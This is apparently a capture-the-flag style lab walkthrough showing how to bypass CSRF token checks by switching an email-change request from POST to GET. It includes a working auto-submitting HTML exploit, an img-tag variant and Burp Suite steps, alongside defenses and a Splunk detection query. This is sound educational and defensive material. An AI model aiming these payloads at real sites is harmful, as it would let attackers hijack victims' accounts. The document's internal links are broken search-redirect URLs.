# Lab Walkthrough: CSRF where token validation depends on request method

* **Vulnerability Type:** Cross-Site Request Forgery (CSRF) / HTTP Method Tampering
* **Target Context:** Client-Side Session Riding (Email Update Functionality)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%25231-vulnerability-architecture--mechanism&utm_source=gemini)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%25232-lab-objectives--verification-criteria&utm_source=gemini)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%25233-step-by-step-exploitation-flow&utm_source=gemini)
4. [HTTP Methods & CSRF Enforcement Comparison](https://www.google.com/search?q=%25234-http-methods--csrf-enforcement-comparison&utm_source=gemini)
5. [Automated Exploitation Script (HTML PoC)](https://www.google.com/search?q=%25235-automated-exploitation-script-html-poc&utm_source=gemini)
6. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%25236-defense-hardening--secure-coding&utm_source=gemini)
7. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%25237-siem-detection--telemetry-analysis&utm_source=gemini)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%25238-troubleshooting--diagnostic-runbook&utm_source=gemini)
9. [References & Standards](https://www.google.com/search?q=%25239-references--standards&utm_source=gemini)

---

## 1. Vulnerability Architecture & Mechanism

This vulnerability occurs when a web framework or developer implements CSRF protection but mistakenly ties the token validation logic strictly to the HTTP `POST` method, while leaving the endpoint capable of processing state-changing actions via HTTP `GET` requests.

* **Real-World Analogy:** Imagine a nightclub with a strict security guard at the front door (the `POST` request handler) checking everyone's VIP pass (the CSRF token). However, the side door (the `GET` request handler) is completely unlocked and unguarded. If you walk through the side door, nobody checks your VIP pass, but you still get access to the club.
* **The Mechanism:** Web frameworks (like older versions of Spring Security or custom Express.js middleware) often apply anti-CSRF checks only to `POST`, `PUT`, or `DELETE` requests, assuming `GET` requests are strictly read-only. If the backend routing allows variables to be passed via the URL query string and processes them as state changes, an attacker can simply switch the method to `GET` to bypass the token check entirely.

> **Learning Checkpoint 1:** Why do frameworks assume `GET` requests don't need CSRF tokens? By HTTP specification (RFC 7231), `GET` requests are intended to be "safe" and "idempotent"—meaning they should only retrieve data and never modify server state. Developers rely on this assumption, which breaks down when they map a `GET` route to a database update function.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The `/my-account/change-email` endpoint.
* **Primary Objective:** Bypass the CSRF token validation by manipulating the HTTP request method, and force a victim to change their email address.
* **Validation Signal:** The lab is solved when the exploit server successfully delivers the payload to the simulated victim, altering their account email.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Baseline Request & Token Validation Check

* Open Burp Suite's browser and log in using `wiener:peter`.
* Submit the "Update email" form with a test email.
* Locate the `POST /my-account/change-email` request in **Proxy > HTTP history** and send it to **Repeater**.
* Modify a single character in the `csrf` parameter and hit **Send**.
* *Observation:* The server responds with an error (e.g., `403 Forbidden` or "Invalid CSRF token"). This confirms the application *does* validate tokens on `POST` requests.

### Phase 2: HTTP Method Tampering

* In Burp Repeater, right-click the request and select **Change request method**. Burp automatically converts the `POST` request to a `GET` request, moving the body parameters (`email` and `csrf`) into the URL query string.
* Remove the `csrf` parameter entirely from the URL: `GET /my-account/change-email?email=hacker@evil.com HTTP/1.1`.
* Hit **Send**.
* *Observation:* The server responds with `302 Found` (redirecting back to the account page), and the email is successfully updated. Token validation was completely bypassed.

### Phase 3: Payload Construction & Execution

* Navigate to the **Exploit Server**.
* Craft an HTML form that mirrors the vulnerable `GET` request. Since HTML `<form>` tags default to the `GET` method when `method="POST"` is omitted, we simply define the action URL and the email input.
* Inject JavaScript to auto-submit the form upon rendering.
* Click **Deliver to victim** to execute the attack on the target user and solve the lab.

> **Learning Checkpoint 2:** Why strip the `csrf` parameter completely during the `GET` request test? If you leave a malformed token in the URL, the backend might still parse it and throw a validation error. Removing it proves that the backend isn't even looking for the parameter when a `GET` request is received.

---

## 4. HTTP Methods & CSRF Enforcement Comparison

Understanding how web frameworks route HTTP verbs dictates how you hunt for bypasses.

| HTTP Method | RFC Standard Intent | Typical CSRF Middleware Action | Vulnerability Potential |
| --- | --- | --- | --- |
| **POST** | State-changing (Create) | Validates Token | Low (If token is cryptographically secure) |
| **GET** | Read-only (Retrieve) | **Ignores Token** | **High** (If routed to a state-changing function) |
| **PUT/PATCH** | State-changing (Update) | Validates Token | Low |
| **OPTIONS** | Pre-flight capability check | Ignores Token | Moderate (CORS misconfigurations) |

---

## 5. Automated Exploitation Script (HTML PoC)

This HTML payload exploits the `GET` method bypass. Notice the absence of the `method="POST"` attribute, forcing the browser to append the hidden input as a URL query string (`?email=...`) via a `GET` request.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>CSRF Method Bypass Exploit</title>
  </head>
  <body>
    <!-- Omitting the 'method' attribute defaults the form to a GET request -->
    <form id="csrf-form" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="pwned-by-attacker@exploit-server.net">
    </form>
    
    <!-- Auto-submission script for zero-click execution -->
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>

```

*Note: Replace `YOUR-LAB-ID` with your active lab instance URL.*

> **Learning Checkpoint 3:** Could this be exploited without an HTML `<form>`? Yes. Because the vulnerability accepts `GET` requests, you could trigger this using a simple image tag: `<img src="https://YOUR-LAB-ID.../change-email?email=hacker@evil.com">`. The browser will issue a `GET` request to fetch the image, simultaneously executing the state change.

---

## 6. Defense, Hardening & Secure Coding

To prevent method-tampering CSRF bypasses, developers must enforce strict routing and validation.

* **Strict HTTP Verb Routing (Primary Defense):** The application framework must explicitly reject `GET` requests for endpoints that modify database state.
* *Insecure (PHP):* `if (isset($_REQUEST['email'])) { updateEmail(); }` (Accepts GET and POST).
* *Secure (Express.js):* `app.post('/change-email', csrfProtection, updateEmail);` (Explicitly binds to POST, returning 405 Method Not Allowed for GET).


* **Global CSRF Middleware:** Ensure the anti-CSRF library applies universally to all state-changing verbs (`POST`, `PUT`, `DELETE`, `PATCH`).
* **SameSite Cookie Attributes:** Implement `SameSite=Lax` or `Strict` on session cookies to prevent the browser from attaching authenticated cookies to cross-origin `POST` and embedded `GET` requests.

---

## 7. SIEM Detection & Telemetry Analysis

Detecting this attack requires monitoring for state-changing parameters appearing in `GET` request URLs, which typically indicates method tampering.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined method=GET 
| search uri_query="*email=*" OR uri_query="*password=*" OR uri_query="*update=*"
| eval is_external_referer=if(match(referer, "^https?://(www\.)?trusted-domain\.com"), "No", "Yes")
| stats count by src_ip, uri_path, uri_query, referer
| where is_external_referer="Yes" AND count > 0

```

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Request fails with `405 Method Not Allowed**` | Strict routing is enabled. | The backend explicitly blocks `GET` requests. You must find a different CSRF token bypass (e.g., token stripping or CORS exploitation). |
| **Request converts to `GET` but still returns `403**` | CSRF parameter left in URL. | Ensure you completely delete the `csrf=...` parameter from the query string before sending the `GET` request. |
| **Exploit page doesn't submit** | JavaScript syntax error. | Verify the form `id` matches exactly with `document.getElementById('csrf-form').submit();`. |
| **Email doesn't change on victim** | Victim session expired. | Ensure the victim (or your test session) is actively authenticated before triggering the exploit. |

---

## 9. References & Standards

* [RFC 7231 - HTTP/1.1 Semantics and Content (Section 4.2.1: Safe Methods)](https://www.google.com/search?q=https://datatracker.ietf.org/doc/html/rfc7231%2523section-4.2.1&utm_source=gemini)
* [OWASP: Cross-Site Request Forgery Prevention Cheat Sheet](https://www.google.com/search?q=https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html&utm_source=gemini)
* [PortSwigger: Bypassing CSRF Token Validation](https://www.google.com/search?q=https://portswigger.net/web-security/csrf/bypassing-token-validation&utm_source=gemini)

---

**Key Insight:** Relying on the `$_REQUEST` variable or loosely defined API routes turns a robust CSRF defense into a localized inconvenience. A security control is only as strong as the strictness of the routing engine enforcing it; if a state change can be executed via a `GET` request, CSRF tokens become entirely irrelevant.
